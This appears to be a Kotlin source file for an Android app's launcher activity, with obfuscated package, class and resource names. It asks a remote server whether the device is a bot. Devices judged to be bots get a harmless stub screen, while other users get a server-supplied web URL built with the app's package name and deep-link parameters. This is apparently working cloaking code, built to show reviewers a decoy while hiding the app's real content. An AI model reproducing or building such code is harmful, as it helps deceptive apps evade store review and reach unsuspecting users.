package com.tfvbnrtlkbnlkrtmblkmrtlkb.rlvkgntrvbmrelkmvlnrekv.fbuvbfbvjkfbvfd.frcbfvhjfrhjvbfr.fvnfdrjnvkjnfrjvf.fvnfdkjvkjfkvnf

import android.content.Context
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import com.android.volley.toolbox.Volley
import com.android.volley.Request
import android.os.Bundle
import com.onesignal.OneSignal
import com.android.volley.toolbox.StringRequest
import com.facebook.FacebookSdk
import android.content.Intent
import com.tfvbnrtlkbnlkrtmblkmrtlkb.rlvkgntrvbmrelkmvlnrekv.fbuvbfbvjkfbvfd.frcbfvhjfrhjvbfr.frvkjrfnvkjnrfjkvnkrft.VrvtfrkvnbkrtgbtyghnBYTHbvnftkrjbg
import com.facebook.applinks.AppLinkData
import com.tfvbnrtlkbnlkrtmblkmrtlkb.rlvkgntrvbmrelkmvlnrekv.R
import com.tfvbnrtlkbnlkrtmblkmrtlkb.rlvkgntrvbmrelkmvlnrekv.fbuvbfbvjkfbvfd.frcbfvhjfrhjvbfr.rfbvhrbvhbkfrvr.fvrnvkjnfrkjvnkjrtnvkrft.VGFrvgfrjnvkjfrtvbrTBVrgtbrt

class VFkfnvjfvnfnvkjfTBVgrftvbjfrntvb : AppCompatActivity() {
    private val spName: String = "CHECK"
    private val spStatus: String = "PASS"
    private val NOBOT_URL = "https://nobot"
    private val BOT_URL = "https://bot"
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.refncknerkjnvcker_frebfjhcvbrehjbjher)
        sendGet1(getString(R.string.fvndjvnkjfdv_vfrvkjnfrgjvkrgtvkbgrt_ftvgjntrnvjbgf))
    }
    private fun sendGet(url: String, deepString: String = "") {
        Log.e("Sending url", url)
        val queue = Volley.newRequestQueue(this)
        val stringRequest = StringRequest(
            Request.Method.GET, url,
            { response ->
                Log.i("Response", response.toString())
            },
            { error ->
                when (error?.networkResponse?.headers?.get("location")) {
                    null -> {
                        startCap()
                    }
                    BOT_URL -> startCap()
                    NOBOT_URL -> {
                        setCheckingState(true)
                        OneSignal.sendTag("nobot", "1")
                        startMain(deepString)
                    }
                }
            })
        queue.add(stringRequest)
    }
    private fun sendGet1(url: String) {
        Log.e("Sending url", url)
        val queue = Volley.newRequestQueue(this)
        val stringRequest = StringRequest(
            Request.Method.GET, url,
            { response ->
                if (response.toString() == "true") {
                    startCap()
                } else {
                    if (getCheckingState()) {
                        Log.e("already", "main")
                        startMain()
                    } else {
                        OneSignal.startInit(this)
                            .inFocusDisplaying(OneSignal.OSInFocusDisplayOption.Notification)
                            .unsubscribeWhenNotificationsAreDisabled(true)
                            .init()
                        FacebookSdk.setAutoInitEnabled(true)
                        FacebookSdk.fullyInitialize()
                        AppLinkData.fetchDeferredAppLinkData(
                            this
                        ) {
                            if (it == null) {
                                sendGet(getString(R.string.fderjvjkfrvkjfvjkf_gbngkfjnbkjgfnbkjgktrfbg))
                            } else {
                                val deepData = it.targetUri
                                sendGet(
                                    getString(R.string.fderjvjkfrvkjfvjkf_gbngkfjnbkjgfnbkjgktrfbg),
                                    deepData?.query.toString()
                                )
                            }
                        }
                    }
                }
                Log.i("Response", response.toString())
            },
            {
                startCap()
            })
        queue.add(stringRequest)
    }
    private fun getBundle(): String {
        return this.packageName
    }
    private fun formUrl(deepString: String): String {
        var url = getString(R.string.vnkfrtjvgftkg_bgtbngtkjnbjkgt_btrgbngtkrjbnkjrt)
        url += "?source=${getBundle()}"
        if (deepString != "") {
            url += "&$deepString"
        }
        Log.e("Url", url)
        return url
    }
    private fun startMain(deepString: String = "") {
        val intent = Intent(this, VGFrvgfrjnvkjfrtvbrTBVrgtbrt::class.java)
        intent.putExtra("url", formUrl(deepString))
        startActivity(intent)
        finish()
    }
    private fun startCap() {
        val intent = Intent(this, VrvtfrkvnbkrtgbtyghnBYTHbvnftkrjbg::class.java)
        startActivity(intent)
        finish()
    }
    private fun setCheckingState(status: Boolean) {
        val sp = getSharedPreferences(spName, Context.MODE_PRIVATE)
        val editor = sp.edit()
        editor.putBoolean(spStatus, status)
        editor.apply()
    }
    private fun getCheckingState(): Boolean {
        val sp = getSharedPreferences(spName, Context.MODE_PRIVATE)
        return sp.getBoolean(spStatus, false)
    }
}